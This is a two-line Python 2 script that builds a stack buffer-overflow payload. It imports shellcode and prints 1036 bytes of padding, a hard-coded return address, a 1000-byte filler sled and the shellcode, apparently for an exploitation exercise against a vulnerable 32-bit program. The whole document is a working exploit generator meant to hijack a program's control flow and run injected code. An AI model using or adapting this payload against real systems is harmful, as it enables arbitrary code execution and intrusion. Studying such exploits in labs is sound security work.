from shellcode import shellcode 
print "a"*1036+"\x48\x5c\xfe\xbf"+"\xff"*1000+shellcode
